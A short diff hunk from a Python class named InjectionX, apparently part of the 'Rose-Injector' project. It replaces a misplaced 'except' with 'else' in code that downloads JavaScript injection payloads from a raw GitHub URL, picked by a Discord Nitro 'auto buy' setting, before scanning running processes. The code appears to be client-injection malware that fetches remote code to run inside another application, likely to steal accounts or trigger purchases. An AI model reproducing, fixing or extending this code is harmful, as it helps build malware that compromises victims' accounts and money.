@@ -20,7 +20,7 @@ class InjectionX:
             self.code = requests.get('https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/injection/auto_buy__TRUE__injection.js').text
         if cc.get_nitro_auto_buy() is False:
             self.code = requests.get('https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/injection/auto_buy__FALSE__injection.js').text
-        except Exception:
+        else:
             self.code = requests.get('https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/injection/auto_buy__FALSE__injection.js').text
 
         for proc in psutil.process_iter():
